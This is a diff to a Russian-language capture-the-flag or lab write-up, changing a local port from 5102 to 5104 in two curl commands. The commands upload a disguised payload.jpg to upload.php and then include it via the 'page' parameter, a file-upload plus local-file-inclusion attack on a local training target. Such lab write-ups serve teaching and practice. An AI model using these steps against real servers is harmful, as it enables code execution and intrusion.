@@ -15,13 +15,13 @@
 2. Загрузить его:
 
    ```bash
-   curl -F "file=@payload.jpg;type=image/jpeg" http://127.0.0.1:5102/upload.php
+   curl -F "file=@payload.jpg;type=image/jpeg" http://127.0.0.1:5104/upload.php
    ```
 
 3. Подключить загруженный файл через параметр `page`:
 
    ```bash
-   curl "http://127.0.0.1:5102/?page=uploads/payload.jpg"
+   curl "http://127.0.0.1:5104/?page=uploads/payload.jpg"
    ```
 
 ## Флаг
